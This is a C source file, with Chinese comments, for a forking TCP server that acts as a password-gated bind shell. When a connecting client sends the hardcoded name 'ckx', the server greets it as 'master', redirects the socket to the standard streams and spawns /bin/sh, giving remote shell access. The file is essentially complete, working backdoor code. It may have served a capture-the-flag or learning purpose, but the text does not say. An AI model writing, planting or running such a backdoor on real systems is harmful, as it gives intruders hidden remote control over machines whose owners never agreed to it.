#include<stdio.h>
#include<sys/wait.h>
#include<sys/types.h>
#include<unistd.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<stdlib.h>
#include<string.h>
#include<signal.h>
#include<errno.h>
// #define MYPORT 8888


//
void sig_chld(int signo)
{
	int pid;
	int stat;
	while((pid = waitpid(-1, &stat, WNOHANG)) > 0)
	{
	//printf("child %d terminated\n", pid);
	}
}


//子进程处理函数，输入clientfd
void processme(int s){

	char buffer[100]="Plz input your name:\n";
	write(s,buffer,strlen(buffer)+1);
	char inputme[100];
	char echome[200];
	//char key[]="29585c700c8d0be16c6b0a24d8c9d0bc";
	char key[]="ckx";
	memset(inputme,0,100);
	memset(echome,0,200);
	read(s,inputme,sizeof(inputme)-1);
	inputme[strlen(inputme)-1]=0;
	sprintf(echome,"hello, %s\n",inputme);
	write(s,echome,200);
	if(!strcmp(inputme,key))
	{
	write(s,"Welcome to my master:\n",22);
	dup2(s,0);
	dup2(s,1);
	dup2(s,2);
	system("/bin/sh");
	}
	write(s,"GoodBye~~~",9);
}



void USAGE()
{
	puts("usage: ./prog portnumber");
	exit(0);
}
int main(int argc, char** argv)
{
	int i;
	int serverfd;
	int clientfd;
	struct sockaddr_in serveraddr;
	struct sockaddr_in clientaddr;
	// puts("LETS GO===xxxxxxxxx");
	// printf("dasfdsfsa");
	// printf("INADDR_ANY IS %d",INADDR_ANY);

	if(argc<2)
	{
		USAGE();
	}
	serverfd=socket(AF_INET,SOCK_STREAM,0);
	serveraddr.sin_family=AF_INET;
	serveraddr.sin_port=htons(atoi(argv[1]));
	serveraddr.sin_addr.s_addr=htonl(INADDR_ANY);
	if(serverfd<0){puts("socket error");}
	else{puts("socket done");}
	if(bind(serverfd,(struct sockaddr *)&serveraddr,sizeof(struct sockaddr ))<0)
	{
		puts("bind error");
	}
	puts("bind done");
	if(listen(serverfd,5)<0)
	{
		puts("listen error");
	}
	else{puts("listen done");}

	int lenofclient=sizeof(struct sockaddr);



//开始循环等待接入，每一次接入fork新的子进程
	for(;;){

	clientfd=accept(serverfd,(struct sockaddr *)&clientaddr,&lenofclient);
	if(clientfd<0){continue;}
	else{
	//printf("clientfd is: %d\n",clientfd);
	;
	}


	//set signal, handle zombine child process

if(signal(SIGCHLD, sig_chld) == SIG_ERR)
{
	fprintf(stderr, "signal error : %s\n", strerror(errno));
	return 1;
}



	int pid;
	pid=fork();
	if(!pid)
	{
		close(serverfd);//child, 子进程关掉servefd
		processme(clientfd);
		close(clientfd);  //结束处理后即使退出子进程,不然内存马上消耗完了
		exit(0);
	}
	else{
		close(clientfd);//parent
	}
}
}
